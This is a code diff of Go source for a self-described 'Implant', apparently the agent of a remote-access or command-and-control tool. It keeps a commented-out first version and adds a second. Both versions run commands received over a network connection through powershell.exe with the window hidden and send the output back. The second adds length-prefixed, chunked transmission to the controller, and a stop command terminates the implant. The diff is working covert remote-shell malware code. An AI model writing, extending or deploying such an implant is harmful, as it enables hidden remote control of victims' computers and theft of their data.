@@ -62,6 +62,29 @@ func listen4Commands(conn *net.Conn) string {
 	return command
 }
 
+//v1
+// func executeCommands(conn *net.Conn, command *string) {
+// 	if *command == "stop\n" {
+// 		terminate()
+// 	}
+// 	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+// 	ps_instance := exec.Command(powershellPath, "/c", *command)
+// 	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
+// 	output, err := ps_instance.Output()
+// 	if err != nil {
+// 		output = []byte("Couldn't execute the command\n")
+// 		fmt.Println("Couldnt Execute the command")
+// 	}
+// 	(*conn).Write(output)
+// }
+
+// func terminate() {
+// 	fmt.Println("Terminating Implant")
+// 	time.Sleep(1 * time.Second)
+// 	os.Exit(0)
+// }
+
+// v2
 func executeCommands(conn *net.Conn, command *string) {
 	if *command == "stop\n" {
 		terminate()
@@ -74,7 +97,33 @@ func executeCommands(conn *net.Conn, command *string) {
 		output = []byte("Couldn't execute the command\n")
 		fmt.Println("Couldnt Execute the command")
 	}
-	(*conn).Write(output)
+	// Convert the directory listing to bytes
+	data := []byte(output)
+	totalLength := uint32(len(data))
+
+	// First, send the size of the data (length prefix)
+	lengthBytes := make([]byte, 4)
+	binary.BigEndian.PutUint32(lengthBytes, totalLength)
+
+	// Send length prefix
+	_, err = (*conn).Write(lengthBytes)
+	if err != nil {
+		fmt.Println("Error sending data length:", err)
+		return
+	}
+
+	// Send data in chunks (partial writes handling)
+	bytesSent := 0
+	for bytesSent < len(data) {
+		n, err := (*conn).Write(data[bytesSent:])
+		if err != nil {
+			fmt.Println("Error sending data:", err)
+			return
+		}
+		bytesSent += n
+	}
+
+	fmt.Printf("Sent %d bytes successfully\n", bytesSent)
 }
 
 func terminate() {
